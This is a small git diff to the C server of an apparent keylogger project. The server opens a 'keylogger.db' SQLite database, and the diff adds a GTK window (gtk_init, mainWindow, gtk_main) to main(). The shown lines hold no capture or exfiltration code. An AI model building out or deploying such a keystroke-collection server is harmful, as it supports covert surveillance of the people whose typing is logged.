@@ -1,6 +1,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include "server.h"
+#include "../database/interface/mainWindow.h"
 #include "../database/database.h"
 
 int			init_socket(nfds_t *reuse)
@@ -158,8 +159,10 @@ void sigint_handler(int sig) {
   _exit(sig);
 }
 
-int main() {
+int main(int argc, char **argv) {
   sqlite3 *keylogger;
+  gtk_init(&argc, &argv);
+  mainWindow();
   int res= sqlite3_open("../database/keylogger.db", &keylogger);
   if(res) {
     perror("can't succeed\n");
@@ -172,5 +175,6 @@ int main() {
   server(addr, keylogger);
   free(addr);
   sqlite3_close(keylogger);
+  gtk_main();
   return 0;
 }
